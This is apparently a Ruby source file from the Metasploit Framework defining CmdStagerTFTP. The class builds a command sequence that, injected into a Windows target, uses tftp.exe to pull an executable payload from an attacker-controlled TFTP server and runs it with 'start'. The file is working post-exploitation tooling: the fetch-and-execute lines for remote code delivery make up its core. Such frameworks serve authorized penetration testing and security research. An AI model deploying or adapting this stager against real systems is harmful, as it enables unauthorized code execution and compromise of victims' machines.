# -*- coding: binary -*-

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'

module Rex
module Exploitation

###
#
# This class provides the ability to create a sequence of commands from an executable.
# When this sequence is ran via command injection or a shell, the resulting exe will
# be written to disk and executed.
#
# This particular version uses tftp.exe to download a binary from the specified
# server.  The original file is preserve, not encoded at all, and so this version
# is significantly simpler than other methods.
#
# Requires: tftp.exe, outbound udp connectivity to a tftp server
#
# Written by Joshua J. Drake
#
###

class CmdStagerTFTP < CmdStagerBase

  def initialize(exe)
    super

    @payload_exe = Rex::Text.rand_text_alpha(8) + ".exe"
  end


  #
  # We override compress commands just to stick in a few extra commands
  # last second..
  #
  def compress_commands(cmds, opts)
    # Initiate the download
    cmds << "tftp -i #{opts[:tftphost]} GET #{opts[:transid]} #{@tempdir + @payload_exe}"

    # Make it all happen
    cmds << "start #{@tempdir + @payload_exe}"

    # Clean up after unless requested not to..
    if (not opts[:nodelete])
      # XXX: We won't be able to delete the payload while it is running..
    end

    super
  end

  # NOTE: We don't use a concatenation operator here since we only have a couple commands.
  # There really isn't any need to combine them. Also, the ms01_026 exploit depends on
  # the start command being issued separately so that it can ignore it :)

  attr_reader :payload_exe
end
end
end
